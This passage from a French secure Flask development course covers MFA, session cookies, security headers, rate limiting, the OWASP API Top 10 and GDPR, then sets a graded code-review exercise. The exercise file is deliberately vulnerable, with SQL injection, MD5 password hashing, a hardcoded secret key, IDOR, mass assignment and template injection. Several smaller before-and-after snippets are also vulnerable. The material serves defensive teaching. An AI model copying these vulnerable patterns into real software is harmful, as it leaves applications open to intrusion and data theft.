        return totp.verify(token, valid_window=1)  # ±30s

@app.route('/mfa/setup', methods=['POST'])
@login_required
def setup_mfa():
    secret = MFAService.generate_secret()
    # Stocker en attente (pas encore activé)
    current_user.mfa_secret_pending = secret
    db.session.commit()

    return jsonify({
        'qr_code': MFAService.generate_qr_code(current_user.email, secret),
        'manual_entry': secret
    })

@app.route('/mfa/verify', methods=['POST'])
@login_required
def verify_mfa_setup():
    token = request.json.get('token')
    if MFAService.verify_token(current_user.mfa_secret_pending, token):
        current_user.mfa_secret = current_user.mfa_secret_pending
        current_user.mfa_enabled = True
        current_user.mfa_secret_pending = None
        # Générer des backup codes
        backup_codes = [secrets.token_hex(4) for _ in range(10)]
        current_user.backup_codes = [hashlib.sha256(c.encode()).hexdigest()
                                       for c in backup_codes]
        db.session.commit()
        return jsonify({'backup_codes': backup_codes})
    return jsonify({'error': 'Code invalide'}), 400
```

**Facteurs d'authentification** : le MFA combine au moins deux facteurs parmi :
- **Ce que je sais** : mot de passe, code PIN
- **Ce que je possède** : smartphone (TOTP), clé de sécurité (FIDO2/WebAuthn)
- **Ce que je suis** : empreinte digitale, reconnaissance faciale

> **À retenir**
> - **Argon2id** est le standard actuel (OWASP) : résistant aux attaques GPU/ASIC grâce à sa consommation mémoire. bcrypt (rounds ≥ 12) reste acceptable si Argon2 n'est pas disponible.
> - MD5 et SHA-256 **ne sont pas des algorithmes de hashage de mots de passe** : leur vitesse est une qualité pour les checksums et un défaut fatal pour les mots de passe.
> - La protection contre le brute force combine trois niveaux indépendants : algorithme lent + lockout progressif + rate limiting — un seul niveau est insuffisant.
> - Le token de réinitialisation doit être haché en base (pas stocké en clair) : un dump de la table des tokens ne doit pas permettre de réinitialiser tous les comptes.

---

## Module 2.6 - Sessions, cookies et headers (30 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Configurer des cookies de session sécurisés (Secure, HttpOnly, SameSite, durée limitée)
> - Implémenter la régénération de session à la connexion pour prévenir la fixation de session
> - Configurer les headers de sécurité essentiels avec Flask-Talisman (HSTS, CSP, X-Frame-Options)
> - Expliquer les risques liés à une mauvaise gestion de session : fixation, hijacking, session éternelle

### 2.5.1 Configuration sessions sécurisées

```python
# config.py
import secrets
from datetime import timedelta

class Config:
    # Secret key forte (32 bytes minimum)
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

    # Sessions
    SESSION_TYPE = 'redis'  # Sessions côté serveur (pas en cookie)
    SESSION_REDIS = redis.Redis(host='localhost', port=6379)
    PERMANENT_SESSION_LIFETIME = timedelta(hours=1)
    SESSION_PERMANENT = False

    # Cookies de session
    SESSION_COOKIE_NAME = 'app_session'  # Pas le nom par défaut
    SESSION_COOKIE_SECURE = True         # HTTPS uniquement
    SESSION_COOKIE_HTTPONLY = True       # Inaccessible via JS
    SESSION_COOKIE_SAMESITE = 'Strict'   # Protection CSRF
    SESSION_COOKIE_DOMAIN = '.app.com'
    SESSION_COOKIE_PATH = '/'

    # Régénération de session
    SESSION_REFRESH_EACH_REQUEST = True
```

### 2.5.2 Gestion de session sécurisée

```python
# session_manager.py
from flask import session
import secrets

class SessionManager:
    @staticmethod
    def login_user(user):
        """Connexion : régénération complète de la session"""
        # Sauvegarder éventuels flash messages
        flash_messages = session.get('_flashes', [])

        # Vider et régénérer la session (anti-fixation)
        session.clear()
        session.regenerate() if hasattr(session, 'regenerate') else None

        # Nouvelle session
        session['user_id'] = user.id
        session['session_id'] = secrets.token_urlsafe(32)
        session['ip'] = request.remote_addr
        session['user_agent'] = request.headers.get('User-Agent', '')
        session['created_at'] = datetime.utcnow().isoformat()

        if flash_messages:
            session['_flashes'] = flash_messages

    @staticmethod
    def logout_user():
        """Déconnexion : destruction complète"""
        session.clear()

    @staticmethod
    def validate_session():
        """Validation à chaque requête"""
        if 'user_id' not in session:
            return False

        # Vérifier que l'IP n'a pas changé (anti-hijacking)
        if session.get('ip') != request.remote_addr:
            session.clear()
            return False

        # Vérifier le user agent
        if session.get('user_agent') != request.headers.get('User-Agent', ''):
            session.clear()
            return False

        # Limite de durée absolue
        created = datetime.fromisoformat(session.get('created_at'))
        if datetime.utcnow() - created > timedelta(hours=12):
            session.clear()
            return False

        return True

@app.before_request
def check_session():
    if request.endpoint and 'auth' in request.endpoint:
        return  # Pas de check sur les endpoints d'auth
    if 'user_id' in session and not SessionManager.validate_session():
        abort(401)
```

### 2.5.3 Headers de sécurité avec Talisman

```python
# security_headers.py
from flask_talisman import Talisman

csp = {
    'default-src': "'self'",
    'script-src': ["'self'", "'nonce-{nonce}'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", 'data:', 'https:'],
    'font-src': ["'self'", 'https://fonts.gstatic.com'],
    'connect-src': "'self'",
    'frame-ancestors': "'none'",
    'form-action': "'self'",
    'base-uri': "'self'",
    'object-src': "'none'",
    'upgrade-insecure-requests': '',
}

Talisman(
    app,
    # HTTPS
    force_https=True,
    force_https_permanent=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    strict_transport_security_include_subdomains=True,
    strict_transport_security_preload=True,

    # CSP
    content_security_policy=csp,
    content_security_policy_nonce_in=['script-src'],

    # Autres headers
    frame_options='DENY',
    referrer_policy='strict-origin-when-cross-origin',
    feature_policy={
        'geolocation': "'none'",
        'microphone': "'none'",
        'camera': "'none'",
    },

    # Cookies
    session_cookie_secure=True,
    session_cookie_http_only=True,
)

# Headers complémentaires
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'

    # Désactiver le cache pour pages sensibles
    if request.path.startswith('/account'):
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
    return response
```

> **À retenir**
> - **Session côté serveur** (Redis, base de données) est préférable à la session en cookie : le serveur peut invalider n'importe quelle session à tout moment.
> - La **régénération de session** à la connexion est obligatoire : sans elle, une session créée avant l'authentification reste valide après (fixation de session).
> - Un logout doit invalider la session **côté serveur** : vider le cookie côté client sans invalider la session serveur ne protège pas contre le rejeu d'une session interceptée.
> - Les cookies de session nécessitent les trois attributs simultanément : `HttpOnly` (pas accessible en JS), `Secure` (HTTPS uniquement), `SameSite=Strict` (protection CSRF).

---

## Module 2.7 - Protection anti-bot et rate limiting (25 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Configurer Flask-Limiter avec des seuils adaptés selon la sensibilité des endpoints
> - Distinguer les quatre stratégies de comptage (fixed window, sliding window, token bucket, leaky bucket) et leurs compromis
> - Intégrer reCAPTCHA v3 dans un formulaire et calibrer le seuil de score
> - Identifier les endpoints nécessitant un rate limiting strict et justifier les seuils choisis

### 2.6.1 Rate Limiting avec Flask-Limiter

```python
# rate_limiting.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379",  # Stockage distribué
    strategy="fixed-window"  # ou "moving-window" pour plus de précision
)

# Endpoints sensibles : limites strictes
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute; 20 per hour")
def login():
    pass

@app.route('/forgot-password', methods=['POST'])
@limiter.limit("3 per hour")
def forgot_password():
    pass

@app.route('/api/search')
@limiter.limit("30 per minute")
def search():
    pass

# Limite custom par utilisateur authentifié
def user_or_ip():
    if current_user.is_authenticated:
        return f"user:{current_user.id}"
    return get_remote_address()

@app.route('/api/heavy-operation')
@limiter.limit("10 per hour", key_func=user_or_ip)
def heavy_op():
    pass

# Réponse personnalisée
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': 'Trop de requêtes',
        'retry_after': e.description
    }), 429
```

**Stratégies de comptage** :
- **Fixed Window** : compteur remis à zéro à intervalle fixe (ex. toutes les minutes) - simple mais peut laisser passer des pics en fin de fenêtre
- **Sliding Window** : fenêtre glissante plus précise (ex. dernière minute glissante à tout instant) - recommandé pour les endpoints sensibles
- **Token Bucket** : nombre fixe de tokens consommés par requête, régénérés périodiquement - lisse le trafic
- **Leaky Bucket** : file d'attente de taille fixe traitée à débit constant ; l'excès est immédiatement rejeté - garantit un débit stable mais peut éliminer des pics légitimes

**Déroulement du rate limiting** : chaque requête est comptée par clé (IP, user_id, endpoint). Quand le seuil est dépassé, le serveur retourne 429 avec un en-tête Retry-After.

```mermaid
sequenceDiagram
    participant C as Client
    participant L as Rate Limiter (Redis)
    participant S as Application
    C->>L: POST /login (IP: 1.2.3.4)
    L->>L: Compteur : 1/5
    L-->>S: OK
    S-->>C: 200 OK
    Note over C,L: Requêtes suivantes...
    C->>L: POST /login (IP: 1.2.3.4)
    L->>L: Compteur : 5/5 (seuil atteint)
    L-->>S: BLOQUÉ
    S-->>C: 429 Too Many Requests<br/>Retry-After: 60
```

### 2.6.2 CAPTCHA (reCAPTCHA v3)

```python
# captcha.py
import requests

class CaptchaService:
    SECRET = os.environ.get('RECAPTCHA_SECRET')
    THRESHOLD = 0.5  # Score minimum (v3)

    @classmethod
    def verify(cls, token: str, action: str, remote_ip: str = None) -> bool:
        try:
            response = requests.post(
                'https://www.google.com/recaptcha/api/siteverify',
                data={
                    'secret': cls.SECRET,
                    'response': token,
                    'remoteip': remote_ip
                },
                timeout=5
            )
            data = response.json()
            return (
                data.get('success', False) and
                data.get('score', 0) >= cls.THRESHOLD and
                data.get('action') == action
            )
        except Exception:
            return False

@app.route('/register', methods=['POST'])
def register():
    captcha_token = request.form.get('g-recaptcha-response')
    if not CaptchaService.verify(captcha_token, 'register', request.remote_addr):
        return jsonify({'error': 'Captcha invalide'}), 400
    # Suite de l'inscription...
```

### 2.6.3 Détection de comportements suspects

```python
# anomaly_detection.py
from collections import defaultdict
from datetime import datetime, timedelta

class AnomalyDetector:
    """Détection basique de comportements suspects"""

    @staticmethod
    def check_login_anomalies(user, request):
        """Vérifie les anomalies à la connexion"""
        alerts = []

        # Nouvelle localisation géographique
        ip_country = get_country_from_ip(request.remote_addr)
        if user.last_login_country and ip_country != user.last_login_country:
            alerts.append({
                'type': 'new_country',
                'severity': 'medium',
                'data': {'country': ip_country}
            })

        # Connexion depuis nouveau device
        device_fingerprint = generate_device_fingerprint(request)
        if device_fingerprint not in user.known_devices:
            alerts.append({
                'type': 'new_device',
                'severity': 'low',
                'data': {'fingerprint': device_fingerprint}
            })

        # Heure inhabituelle
        hour = datetime.utcnow().hour
        if user.typical_hours and hour not in user.typical_hours:
            alerts.append({
                'type': 'unusual_time',
                'severity': 'low'
            })

        return alerts

    @staticmethod
    def handle_alerts(user, alerts):
        """Réponse adaptative aux alertes"""
        severity_max = max((a['severity'] for a in alerts), default='none')

        if severity_max == 'high':
            # Bloquer + notifier
            user.locked_until = datetime.utcnow() + timedelta(hours=1)
            send_security_alert(user.email, alerts)
        elif severity_max == 'medium':
            # Demander MFA obligatoire
            return 'require_mfa'
        elif severity_max == 'low':
            # Notification seulement
            send_notification(user.email, alerts)

        return 'allow'
```

> **À retenir**
> - Le rate limiting **par IP seule** est contournable (rotation d'IP, botnets) : combiner avec une clé par utilisateur authentifié pour les endpoints sensibles.
> - Les endpoints à brute force critique (login, reset-password, register) nécessitent des seuils stricts : 5 tentatives par minute maximum.
> - Le stockage du compteur en **Redis partagé** est obligatoire en architecture multi-instances : un compteur en mémoire locale ne s'applique qu'à une seule instance.
> - Retourner l'en-tête `Retry-After` dans les réponses 429 pour éviter les boucles de retry immédiates côté client.

---

## Module 2.8 - Plan de sécurité applicative (20 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Décrire les quatre phases d'un SDLC sécurisé et nommer les outils associés à chaque phase
> - Configurer un pipeline d'analyse statique avec Bandit et un hook pre-commit de détection de secrets
> - Utiliser la checklist Security by Design pour auditer une application existante
> - Distinguer SAST et DAST et expliquer pourquoi les deux sont nécessaires

### 2.7.1 SDLC sécurisé

```mermaid
graph LR
    C[Conception] --> D[Développement]
    D --> T[Test]
    T --> DEP[Déploiement]
    C -.-> C1["Threat modeling<br/>Architecture review"]
    D -.-> D1["Code review<br/>OWASP ASVS<br/>Linters<br/>Pre-commit hooks<br/>SCA"]
    T -.-> T1["SAST<br/>DAST<br/>Pentest<br/>Dependency audit"]
    DEP -.-> DEP1["Hardening<br/>Secrets mgmt<br/>Monitoring<br/>Incident response"]
```

### 2.7.2 Outils Python pour le SDLC sécurisé

**SAST (Static Application Security Testing)** :

```bash
# Bandit - SAST Python
pip install bandit
bandit -r ./app -f json -o bandit_report.json

# Semgrep - patterns custom
pip install semgrep
semgrep --config=auto ./app
```

**SCA (Software Composition Analysis)** :

```bash
# Safety - vulnérabilités dans dépendances
pip install safety
safety check --json

# pip-audit - audit officiel PyPA
pip install pip-audit
pip-audit -r requirements.txt
```

**Pre-commit hooks** :

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ['-r', 'app/']

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  - repo: https://github.com/pypa/pip-audit
    rev: v2.6.1
    hooks:
      - id: pip-audit
```

### 2.7.3 Checklist Security by Design

```markdown
## ✅ Checklist complète Security by Design

### Authentification
- [ ] Mots de passe hashés avec Argon2 (ou bcrypt rounds≥12)
- [ ] Politique de mot de passe forte (≥12 chars, complexité)
- [ ] Vérification HaveIBeenPwned au signup
- [ ] MFA disponible (TOTP) pour comptes sensibles
- [ ] Protection brute force (rate limiting + lockout progressif)
- [ ] Réinitialisation par token à usage unique, expirant
- [ ] Pas d'énumération possible (timing constant)
- [ ] Régénération session après login (anti-fixation)
- [ ] Logout invalide réellement la session côté serveur

### Autorisation
- [ ] Principe du moindre privilège
- [ ] Vérification serveur systématique (jamais que client)
- [ ] Pas d'IDOR (filtrage par owner ou UUIDs)
- [ ] RBAC ou ABAC implémenté
- [ ] Mass assignment empêché (whitelist/schemas)

### Données
- [ ] Chiffrement au repos (AES-256-GCM)
- [ ] Chiffrement en transit (TLS 1.2+ uniquement)
- [ ] Minimisation des données (RGPD)
- [ ] PII jamais loggées
- [ ] Anonymisation/pseudonymisation où possible
- [ ] Politique de rétention définie et appliquée
- [ ] Procédures RGPD : accès, suppression, portabilité

### Validation et encodage
- [ ] Validation côté serveur (Pydantic/Marshmallow)
- [ ] Échappement contextuel (HTML, JS, SQL, URL)
- [ ] Requêtes paramétrées partout
- [ ] Templates avec auto-escape activé
- [ ] Pas de eval(), exec(), pickle non sécurisé

### Communication
- [ ] HTTPS obligatoire (HSTS preload)
- [ ] Headers de sécurité (Talisman)
- [ ] CSP stricte (pas de unsafe-inline si possible)
- [ ] Cookies : Secure, HttpOnly, SameSite=Strict
- [ ] CORS restrictif (pas de wildcard avec credentials)

### Infrastructure
- [ ] WAF en place (Cloudflare, AWS WAF, ModSecurity)
- [ ] Secrets dans vault (jamais en code)
- [ ] Dépendances scannées (Dependabot + safety)
- [ ] Container scanné (Trivy, Grype)
- [ ] Configuration durcie (CIS Benchmarks)
- [ ] Backups chiffrés et testés

### Monitoring et réponse
- [ ] Logs de sécurité centralisés (SIEM)
- [ ] Alertes sur événements critiques
- [ ] Détection d'anomalies
- [ ] Plan de réponse aux incidents documenté
- [ ] Tests de restauration de backup
- [ ] Bug bounty / programme de divulgation

### Processus
- [ ] Threat modeling à la conception
- [ ] Code review obligatoire (avec checklist sécu)
- [ ] SAST en CI/CD (Bandit, Semgrep)
- [ ] DAST périodique (ZAP, Burp)
- [ ] Pentest annuel
- [ ] Formation sécurité de l'équipe
- [ ] Veille CVE active
```

> **À retenir**
> - La sécurité intégrée dès la conception coûte **10 à 100 fois moins cher** à corriger qu'une vulnérabilité découverte en production (règle NIST).
> - **SAST** (Bandit, Semgrep) détecte les patterns dangereux dans le code source ; **DAST** (ZAP, Burp) teste l'application en cours d'exécution : les deux sont complémentaires.
> - Les pre-commit hooks bloquent les secrets avant qu'ils entrent dans le dépôt Git — une fois poussés, ils sont compromis même après suppression (historique indexé).
> - La checklist Security by Design est un outil de revue, pas de certification : cocher toutes les cases ne garantit pas l'absence de vulnérabilités.

---

## Module 2.9 - Référentiel OWASP API Security Top 10 (15 min)

> **Objectifs** — À l'issue de ce module, vous serez capables de :
> - Mettre en correspondance les catégories OWASP Web Top 10 et OWASP API Top 10
> - Identifier les spécificités des APIs en matière de sécurité par rapport aux applications web traditionnelles
> - Appliquer les protections contre BOLA, Excessive Data Exposure et Mass Assignment dans une API REST Flask
> - Expliquer pourquoi une interface Swagger exposée sans authentification en production est un risque

> Source : [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
> Version de référence : **API Security Top 10 2019**, toujours largement utilisée dans la documentation et les formations.

Les API exposent des fonctionnalités et des données de manière structurée mais très directe. Beaucoup de protections implicites des applications web traditionnelles (session, templating, UI) disparaissent, ce qui justifie une liste de risques spécifique.

### 2.8.1 Vue d'ensemble

| Code | Catégorie | Lien avec cette séance |
|------|-----------|------------------------|
| **API1:2019** | Broken Object Level Authorization (BOLA / IDOR) | Module 2.2 (IDOR) |
| **API2:2019** | Broken User Authentication | Module 2.4 (Auth, JWT, MFA) |
| **API3:2019** | Excessive Data Exposure | Module 2.3 (DTO, serializers) |
| **API4:2019** | Lack of Resources & Rate Limiting | Module 2.6 (Rate limiting) |
| **API5:2019** | Broken Function Level Authorization | Module 2.2 (RBAC/ABAC) |
| **API6:2019** | Mass Assignment | Module 2.3 (Mass Assignment) |
| **API7:2019** | Security Misconfiguration | Module 2.5 (Headers, CORS) |
| **API8:2019** | Injection | Séance 1 (rappel API-centric) |
| **API9:2019** | Improper Assets Management | Module 2.7 (SDLC, versionning) |
| **API10:2019** | Insufficient Logging & Monitoring | Module 2.5 / Checklist |

### 2.8.2 Détail des risques majeurs

**API1:2019 – Broken Object Level Authorization (BOLA)**

La vulnérabilité la plus fréquente en API : un utilisateur authentifié accède ou modifie des ressources qui ne lui appartiennent pas via des identifiants manipulables.

```python
# 🚨 VULNÉRABLE
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    return jsonify(Order.query.get(order_id).to_dict())  # Aucune vérif de propriétaire

# ✅ SÉCURISÉ
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get_or_404(order_id)
    if order.user_id != current_user.id and not current_user.is_admin:
        abort(403)
    return jsonify(order.to_dict())
```

**Mesures** : vérifier systématiquement, pour chaque requête, que l'objet appartient à l'appelant ou est autorisé par son rôle. Tests automatisés BOLA (essayer d'accéder aux ressources d'autres utilisateurs).

**API3:2019 – Excessive Data Exposure**

L'API renvoie trop de données, en comptant sur le front-end pour masquer ce qui ne doit pas être affiché.

```python
# 🚨 VULNÉRABLE - to_dict() expose tout, y compris password_hash et is_admin
return jsonify(user.to_dict())

# ✅ SÉCURISÉ - DTO explicite
def user_public_dto(user):
    return {
        'id': user.public_id,
        'username': user.username,
        'avatar_url': user.avatar_url
    }
return jsonify(user_public_dto(user))
```

**Mesures** : filtrer côté serveur, DTO (Data Transfer Objects) ou serializers explicitant les champs exposés, revue systématique des réponses.

**API4:2019 – Lack of Resources & Rate Limiting**

L'API ne contrôle pas le volume de requêtes ni la taille des ressources, permettant DoS, extraction massive, brute force.

**Mesures** :
- Rate limiting (par IP, token, utilisateur), quotas — voir Module 2.6
- Pagination obligatoire pour les listes
- Limites de taille pour les payloads et les fichiers uploadés
- Timeouts serveur raisonnables

**API6:2019 – Mass Assignment**

L'API mappe directement le JSON reçu sur un modèle interne sans restreindre les champs modifiables — voir Module 2.3.

```python
# 🚨 VULNÉRABLE - PATCH /api/users/me avec {"is_admin": true}
for key, value in request.json.items():
    setattr(user, key, value)

# ✅ SÉCURISÉ - whitelist explicite
ALLOWED = {'username', 'bio', 'avatar_url'}
for key, value in request.json.items():
    if key in ALLOWED:
        setattr(user, key, value)
```

**API7:2019 – Security Misconfiguration (spécificités API)**
- CORS permissif (`Access-Control-Allow-Origin: *` avec `Allow-Credentials: true`)
- Interface Swagger ouverte avec toutes les opérations de prod, sans auth
- Messages d'erreur internes détaillés renvoyés au client
- **Mesures** : CORS strict, protection des interfaces de documentation, désactivation de debug en production

**API9:2019 – Improper Assets Management**

Mauvaise gestion du cycle de vie des versions : endpoints oubliés, non documentés ou dépréciés restent accessibles.

- Ancienne version `/v1` toujours exposée et non maintenue, avec failles connues
- Endpoints internes ou de test laissés déployés en prod
- **Mesures** : catalogue complet des APIs (documentation, versions, propriétaires), stratégie de versionning, scans pour découvrir les *shadow APIs*

**API10:2019 – Insufficient Logging & Monitoring**

Focalisé sur les API : appels massifs, patterns d'abus, anomalies de tokens.
- Journalisation contextualisée : identifiant API client, user_id, IP, endpoint, statut
- Centralisation, dashboards API, alertes sur patterns anormaux
- Corrélation avec les logs d'authentification, WAF, reverse proxy

### 2.8.3 Correspondance Web ↔ API

| OWASP Web Top 10 (2021) | OWASP API Top 10 (2019) | Spécificité API |
|-------------------------|--------------------------|------------------|
| A01 - Broken Access Control | API1 BOLA + API5 Function Level | IDs manipulables, endpoints granulaires |
| A02 - Cryptographic Failures | API2 Broken Authentication | JWT, tokens, OAuth |
| A03 - Injection | API8 Injection | Filtres et tris depuis paramètres JSON |
| A04 - Insecure Design | API6 Mass Assignment | Binding direct JSON ↔ modèle |
| A05 - Security Misconfig | API7 Security Misconfig | CORS, Swagger exposé |
| A09 - Logging Failures | API10 Insufficient Logging | Patterns d'abus de tokens |
| — | API3 Excessive Data Exposure | Réponses JSON trop riches |
| — | API4 Lack of Rate Limiting | DoS via endpoints peu coûteux |
| — | API9 Improper Assets Mgmt | Shadow APIs, versions dépréciées |

> **À retenir**
> - Les APIs amplifient les risques des applications web : pas de session traditionnelle, des IDs directement dans les URLs, des réponses JSON souvent très complètes.
> - **BOLA** (API1) est la vulnérabilité la plus fréquente en API : vérifier systématiquement la propriété ou le rôle avant de retourner tout objet.
> - **Excessive Data Exposure** (API3) : ne jamais retourner le modèle complet — définir des DTOs explicites avec les champs strictement nécessaires.
> - Une interface Swagger/OpenAPI exposée sans authentification en production est une cartographie complète de l'API offerte à l'attaquant.

---

## Module 2.10 - Conformité RGPD et implications techniques (15 min)

> **Objectif** — Mettre en perspective toutes les vulnérabilités étudiées en Séance 1 et 2 avec leurs impacts RGPD et les obligations légales associées.

### 2.9.1 Synthèse : vulnérabilités et impacts RGPD

Le RGPD impose la protection dès la conception et l'intégrité des données. Chaque vulnérabilité compromet au minimum deux piliers : **confidentialité** (Article 5(1)(f)) et souvent la **disponibilité** ou l'**intégrité**.

**Matrice vulnérabilité → impact RGPD → obligation légale** :

| Vulnérabilité | Impact | Article RGPD | Sanction type |
|---|---|---|---|
| #1, #2 — SQL Injection | Fuite de données personnelles (BDD compromise) | Art. 32, Art. 5(1)(f) | 4% CA ou 20M€ |
| #3, #4, #5 — XSS | Exfiltration de sessions → accès non autorisé aux données | Art. 5(1)(f), Art. 32 | Notification CNIL + 3–7% CA |
| #6 — CSRF | Modification non autorisée de données, suppression de consentements | Art. 5(1)(d), Art. 7 | 3–4% CA |
| #7 — IDOR | Énumération + accès à dossiers d'autres utilisateurs | Art. 5(1)(a), Art. 32 | Notification + sanctions |
| #8 — Mass Assignment | Escalade de privilèges → accès aux rôles admin | Art. 32 | 4% CA |
| #9 — SSTI (RCE) | Accès complet au serveur, vol de secrets API | Art. 32, Art. 33 | 4% CA + responsabilité pénale |
| #10 — Path Traversal | Accès à fichiers sensibles (config, clés, données PII) | Art. 32, Art. 5(1)(f) | 3–4% CA |
| #11 — Command Injection | RCE, accès système complet | Art. 32 | 4% CA |
| #12 — Hashage MD5 | Mots de passe cassables → accès utilisateurs | Art. 32 (mesures « appropriées ») | 3% CA |
| #13 — Cookies non sécurisés | Usurpation de session, vol de jetons | Art. 5(1)(f), Art. 32 | Notification + 2–3% CA |
| #14 — Absence Rate Limiting | Énumération de comptes, bruteforce | Art. 32 (sécurité) | 2% CA |
| #15 — Headers absents | Surface d'attaque élargie, attaques navigateur non bloquées | Art. 25 (Privacy by Design) | 2–3% CA |

### 2.9.2 Obligations en cas de violation

**Détection → Évaluation → Notification (72h)**

```
Détection d'une fuite ou compromission
    ↓
Évaluation du risque pour les droits des personnes
    ↓
Oui, risque probable → Notification CNIL sous 72h
                    → Notification personnes concernées sous 3j si risque élevé
                    → Documentation : cause racine, données compromises, mesures correctives
    ↓
Non → Enregistrement en registre des violations (audit trail interne)
```

**Sanctions graduées par gravité** :

- **Infraction mineure** (notification tardive, documentation incomplète) : jusqu'à 2% du CA
- **Infraction grave** (données sensibles compromise, pas de chiffrement) : jusqu'à 4% du CA
- **Cas exceptionnels** (données biométriques, santé, art. 9) : jusqu'à 4% CA + amende pénale

### 2.9.3 Intégration du RGPD en Security by Design

**Couches de protection** :

1. **Minimisation** : ne stocker que les champs nécessaires
   - Exemple : âge au lieu de date de naissance complète
   - Bénéfice : moins de données volées en cas de fuite

2. **Chiffrement au repos** : `AES-256-GCM` pour données sensibles
   - Exemple : tokens de session, clés privées (KMS)
   - Bénéfice : fuite ≠ compromission (clés de déchiffrement ailleurs)

3. **Accès restreint** : RBAC strict, audit trail
   - Exemple : seul un admin peut accéder aux données médicales
   - Bénéfice : traçabilité complète en cas de violation

4. **Durée de rétention** : suppression automatique après délai
   - Exemple : logs d'accès archivés après 90 jours
   - Bénéfice : réduction de la fenêtre d'exposition

5. **Chiffrement en transit** : TLS 1.2+ obligatoire
   - Exemple : Cookie `Secure` + `SameSite`
   - Bénéfice : sniffing/MITM bloqués

6. **Audit et traçabilité** : logs structurés + alertes
   - Exemple : accès anormal à données sensibles → alerte
   - Bénéfice : détection précoce des attaques

> **À retenir**
> - Chaque vulnérabilité **peut déclencher une obligation de notification CNIL** si elle expose des données personnelles.
> - Le délai de notification est **72 heures** dès la découverte.
> - Le RGPD s'applique à l'entreprise qui déploie l'application — la responsabilité est solidaire.
> - Privacy by Design n'est pas un module optionnel — c'est une obligation légale intégrée dès la conception (Article 25).

---

# 📝 EXERCICES SÉANCE 2

## Exercice 2.A — Revue de Code Sécurité (Travail individuel en séance)

```
┌─────────────────────────────────────────────────────────────┐
│  Durée : 45 minutes EN SÉANCE (documents autorisés)         │
│  Rendu : PDF via formulaire en ligne avant la fin de séance │
│  Pondération : 15% de la note finale                        │
└─────────────────────────────────────────────────────────────┘
```

### 🎯 Consigne

Le code suivant est un extrait d'une application Flask de gestion de commandes. Il contient **9 vulnérabilités de sécurité**.

**Pour chaque vulnérabilité :**
1. Indiquer le numéro de ligne
2. Nommer la vulnérabilité
3. Donner le CWE correspondant
4. Évaluer le score CVSS v3.1 (vecteur simplifié accepté)
5. Proposer une correction (code ou description)

---

### 📄 Code à analyser — `orders_api.py`

```python
# orders_api.py - API de gestion des commandes
# Version : 1.0 (production)
import os
import hashlib
import sqlite3
from flask import Flask, request, jsonify, render_template_string, session

app = Flask(__name__)
app.secret_key = "flask_secret_2024"                          # ligne 8

db_path = "orders.db"


def get_db():
    return sqlite3.connect(db_path)


# ── Authentification ──────────────────────────────────────────
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    # Hashage du mot de passe
    pwd_hash = hashlib.md5(password.encode()).hexdigest()      # ligne 23

    conn = get_db()
    query = f"""
        SELECT id, username, role
        FROM users
        WHERE username = '{username}'                          # ligne 29
        AND password_hash = '{pwd_hash}'
    """
    cursor = conn.execute(query)                               # ligne 32
    user = cursor.fetchone()
    conn.close()

    if user:
        session['user_id'] = user[0]
        session['username'] = user[1]
        session['role'] = user[2]
        return jsonify({'status': 'ok', 'role': user[2]})

    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401


# ── Commandes ────────────────────────────────────────────────
@app.route('/api/orders/<int:order_id>', methods=['GET'])
def get_order(order_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = get_db()
    # Récupération de la commande par ID
    order = conn.execute(
        "SELECT * FROM orders WHERE id = ?", (order_id,)
    ).fetchone()                                               # ligne 52
    conn.close()

    if not order:
        return jsonify({'error': 'Not found'}), 404

    return jsonify({
        'id': order[0],
        'user_id': order[1],
        'product': order[2],
        'amount': order[3],
        'address': order[4]
    })


@app.route('/api/orders', methods=['POST'])
def create_order():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()

    # Création de la commande avec toutes les données reçues
    conn = get_db()
    conn.execute("""
        INSERT INTO orders (user_id, product, amount, address, status, is_paid)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (
        data.get('user_id', session['user_id']),               # ligne 77
        data.get('product'),
        data.get('amount'),
        data.get('address'),
        data.get('status', 'pending'),                         # ligne 81
        data.get('is_paid', 0)                                 # ligne 82
    ))
    conn.commit()
    conn.close()
    return jsonify({'status': 'created'}), 201


# ── Administration ───────────────────────────────────────────
@app.route('/admin/report')
def admin_report():
    if session.get('role') != 'admin':
        return jsonify({'error': 'Forbidden'}), 403

    report_name = request.args.get('report', 'default')

    # Rendu du rapport
    template = f"""
    <html>
    <body>
        <h1>Rapport : {report_name}</h1>                      # ligne 98
        <p>Généré par : {session['username']}</p>
        <p>Total commandes : {{{{ total }}}}</p>
    </body>
    </html>
    """
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
    conn.close()
    return render_template_string(template, total=total)       # ligne 107


# ── Export ───────────────────────────────────────────────────
@app.route('/api/export')
def export_data():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

